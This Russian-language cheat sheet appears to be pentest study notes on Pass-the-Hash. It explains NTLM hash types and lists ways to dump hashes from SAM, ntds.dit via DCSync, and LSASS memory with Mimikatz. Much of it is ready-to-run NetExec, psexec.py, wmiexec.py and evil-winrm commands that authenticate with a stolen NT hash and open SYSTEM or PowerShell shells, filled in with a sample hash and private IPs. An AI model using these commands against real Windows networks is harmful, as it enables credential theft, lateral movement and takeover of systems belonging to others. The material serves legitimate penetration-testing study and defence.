## Объединенный отчет: PASS-THE-HASH & CREDENTIAL REUSE

## ЧАСТЬ 1: PASS-THE-HASH (PtH) — ИСПОЛЬЗОВАНИЕ ХЭША ВМЕСТО ПАРОЛЯ

### Что это

Аутентификация с использованием только NTLM хэша, без знания пароля.

### Почему это работает

NTLM протокол использует хэш пароля напрямую в challenge-response механизме. Серверу/DC не нужен пароль, достаточно правильного response, который вычисляется из хэша. Пароль никогда не участвует в обмене.


### ВАЖНО: НЕ ПУТАТЬ ДВА ТИПА ХЭШЕЙ

**NT хэш (можно Pass-the-Hash)**
- Откуда: SAM, NTDS.dit, LSASS память (Mimikatz, secretsdump.py)
- Формат: 32 hex символа (пример: fa0af7f6a73316dd59f0be812dbf3c12)
- Можно использовать для PtH: **ДА**

**Net-NTLMv2 хэш (нельзя Pass-the-Hash)**
- Откуда: перехват сети (Responder, coercion атаки)
- Формат: длинный, много полей (user::DOMAIN:challenge:hmac:blob)
- Можно использовать для PtH: **НЕТ** (только взлом или relay)

Ключевое различие: NT хэш — это пароль в захэшированном виде. Net-NTLMv2 — это одноразовый ответ на challenge.


### Где взять NT хэш

- Дамп SAM на скомпрометированной машине
- Дамп ntds.dit с DC (через DCSync)
- Память процесса lsass.exe (Mimikatz sekurlsa::logonpasswords)
- Файлы с дампами от secretsdump.py


### Проверка доступа с хэшем (NetExec)

**Без флага --local-auth** (проверка доменной учетки):
nxc smb TARGET_IP -u Administrator -H NTLM_HASH

**С флагом --local-auth** (проверка локальной учетки на цели):
nxc smb TARGET_IP -u Administrator -H NTLM_HASH --local-auth

Индикатор `(Pwn3d!)` в выводе = учетка имеет Local Admin права на цели.


### Получение shell с хэшем (Impacket)

Формат -hashes: `LM_hash:NTLM_hash`

Если NT хэш известен, LM хэш можно оставить пустым:
:fa0af7f6a73316dd59f0be812dbf3c12

**psexec.py:**
psexec.py -hashes :NTLM_HASH Administrator@TARGET_IP

**wmiexec.py:**
wmiexec.py -hashes :NTLM_HASH Administrator@TARGET_IP

**evil-winrm:**
evil-winrm -i TARGET_IP -u Administrator -H NTLM_HASH

**smbclient.py:**
smbclient.py DOMAIN/user@IP -hashes :NTLM_HASH


### Против каких протоколов работает Pass-the-Hash

- SMB (файловые шары, psexec, smbexec)
- WMI (wmiexec.py)
- WinRM (evil-winrm)
- RDP (с ограничениями, требует Restricted Admin Mode)


### Примеры команд

**Проверка доступа через SMB:**
nxc smb 192.168.13.51 -u Administrator -H fa0af7f6a73316dd59f0be812dbf3c12 --local-auth

**Получение SYSTEM shell через psexec:**
psexec.py -hashes :fa0af7f6a73316dd59f0be812dbf3c12 Administrator@192.168.13.51

**Получение PowerShell сессии через evil-winrm:**
evil-winrm -i 192.168.13.51 -u Administrator -H fa0af7f6a73316dd59f0be812dbf3c12

## КЛЮЧЕВЫЕ ВЫВОДЫ

1. NT хэш ≠ Net-NTLMv2 хэш. Первый можно передавать (Pass-the-Hash), второй — только взламывать или ретранслировать.

2. Pass-the-Hash работает через SMB, WMI, WinRM — если учетка имеет Local Admin права на цели.

3. Флаг `--local-auth` в NetExec критически важен при работе с локальными учетками.

4. Индикатор `(Pwn3d!)` = учетка является локальным администратором на цели.